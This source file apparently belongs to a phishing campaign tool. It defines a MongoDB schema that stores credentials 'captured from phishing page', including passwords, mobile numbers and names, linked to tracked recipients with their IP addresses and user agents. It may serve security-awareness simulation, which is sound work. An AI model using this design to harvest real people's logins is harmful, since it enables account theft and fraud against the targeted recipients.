const mongoose = require('mongoose');

const capturedCredentialSchema = new mongoose.Schema({
  campaignId: { type: mongoose.Schema.Types.ObjectId, ref: 'Campaign' },
  campaignTitle: { type: String, default: '' },
  recipientEmail: { type: String, required: true },
  recipientName: { type: String, default: 'User' },
  trackingToken: { type: String, required: true },
  
  // Captured credentials from phishing page
  identifier: { type: String },
  mobile: { type: String },
  countryCode: { type: String },
  name: { type: String },
  password: { type: String },
  
  // Metadata
  ipAddress: { type: String },
  userAgent: { type: String },
  capturedAt: { type: Date, default: Date.now }
}, {
  timestamps: true
});

// Index for faster queries
capturedCredentialSchema.index({ recipientEmail: 1 });
capturedCredentialSchema.index({ campaignId: 1 });
capturedCredentialSchema.index({ trackingToken: 1 });

module.exports = mongoose.model('CapturedCredential', capturedCredentialSchema);
